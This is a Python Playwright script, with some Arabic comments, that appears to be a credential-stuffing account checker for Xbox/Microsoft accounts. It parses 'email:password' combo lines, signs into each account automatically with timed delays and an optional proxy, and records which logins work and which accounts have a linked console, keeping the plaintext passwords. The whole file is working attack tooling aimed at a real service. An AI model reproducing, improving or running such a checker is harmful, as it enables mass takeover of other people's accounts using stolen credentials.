import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

async def check_console_availability_with_refresh(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(1, 4):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("networkidle", timeout=60000)
            await asyncio.sleep(2)
            text = (await page.inner_text('body')).lower()
            if "play your console remotely" in text:
                return True, "Play your console remotely", True
            if "set up your console" in text:
                return False, "Set up your console (no device)", True
            if "sign in to finish setting up" in text:
                return False, "Sign in to finish setting up", False
        except Exception as e:
            if attempt == 3:
                return False, f"Error: {str(e)[:80]}", False
    return False, "Unknown status", False

async def handle_password_entry(page, account_email: str, password: str) -> bool:
    try:
        # انتظار حقل كلمة المرور
        try:
            await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=5000)
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(5)
            return True
        except PlaywrightTimeoutError:
            pass
        # الضغط على "Sign in another way" إن وجد
        for selector in ["a:has-text('Sign in another way')", "button:has-text('Sign in another way')"]:
            if await page.locator(selector).count():
                await page.click(selector)
                await page.wait_for_load_state("networkidle")
                break
        # الضغط على "Use your password"
        for selector in ["a:has-text('Use your password')", "button:has-text('Use your password')"]:
            if await page.locator(selector).count():
                await page.click(selector)
                await page.wait_for_load_state("networkidle")
                break
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=10000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(5)
        return True
    except Exception:
        return False

async def process_account(account: Dict, proxy=None, headless=True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(headless=headless)
        context = await browser.new_context(viewport={'width':1280,'height':720}, user_agent='Mozilla/5.0')
        page = await context.new_page()
        await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")
        # Email
        await page.fill("input[type='email'], input[name='loginfmt']", account['email'])
        await asyncio.sleep(7)
        # Next
        next_btn = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next')").first
        await next_btn.click()
        await page.wait_for_load_state("networkidle")
        # Password
        if not await handle_password_entry(page, account['email'], account['password']):
            raise Exception("Password entry failed")
        # Submit
        submit_btn = page.locator("input[type='submit'], input#idSIButton9, button:has-text('Next'), button:has-text('Sign in')").first
        await submit_btn.click()
        await page.wait_for_load_state("networkidle")
        # Stay signed in
        try:
            stay = page.locator("input[value='Yes'], button:has-text('Yes')").first
            await stay.click(timeout=3000)
        except:
            pass
        has_console, console_info, login_success = await check_console_availability_with_refresh(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info
        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"Exception: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
